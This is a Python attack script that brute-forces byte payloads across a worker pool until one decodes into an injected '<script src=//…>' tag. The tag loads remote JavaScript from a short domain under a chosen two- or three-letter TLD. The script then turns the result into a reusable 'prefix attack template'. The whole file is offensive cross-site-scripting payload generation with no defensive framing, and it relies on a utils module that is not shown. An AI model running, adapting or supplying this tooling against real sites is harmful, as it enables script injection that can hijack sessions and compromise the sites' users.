#!/usr/bin/env python3
from utils import *
import sys

'''
This tool uses the tld_template_table crutches
to create templates for new TLDs to bruteforce their prefixes
'''

if __name__ == "__main__":
    #''' Target specific TLDs
    target_tld = sys.argv[1].upper() # ie: BZ, PE
    if len(target_tld) == 2:
        dtt = tld_template_table['threeXtwo'] # via utils.py
    elif len(target_tld) == 3:
        dtt = tld_template_table['threeXthree'] # via utils.py
    else:
        print('attack not supported')
        sys.exit(0)
    
    template = dtt[0]
    attack = Attack(dtt[0], dtt[1], dtt[2], poolSz=8)
    brange = attack.range
    #'''

    pattern = (".*\<script src=//([A-Z0-9\-]{3,6}\.\w{%s})\>\</script\>" % len(target_tld)).encode()
    pattern = re.compile(pattern, re.IGNORECASE)
    print('[+] Generating payload tables for TLD: .%s' % target_tld)
    #for result in attack.pool.imap_unordered(attack.f, range(attack.start, attack.end + 1), 1000):
    for result in attack.pool.imap_unordered(work, gen(attack.start, attack.end + 1, attack.template, attack.range), 1000):
        m = re.match(pattern, result[0])
        if m is not None:
            domain = m.group(1).decode()
            prefix = domain.split(".")[0]
            _tld = domain.split(".")[1]
            payload = result[1]

            if _tld.upper() == target_tld:
                print("Found new payload: {},{}".format(domain, payload))
                print('Building prefix attack template...')
                if len(target_tld) == 2:
                    regex = '6e6e5111111e(.*)576e69b163'
                    rep = '511111' # the 1e is the period
                elif len(target_tld) == 3:
                    regex = '6e6e51111e(.*)576e69b163'
                    rep = '5111' # the 1e is the period
                m = re.search(regex, payload)
                construct = template.format(m.group(1))
                new_template = construct.replace(rep, '{}')
                print('Constructed attack %s template: %s' % (target_tld, new_template))
                print('range: 0x%s, 0x%s' % ('1'.ljust(len(rep),'1'), 'f'.ljust(len(rep),'f')))
                break
    attack.pool.close()
    attack.pool.join()
    print('[+] DONE')
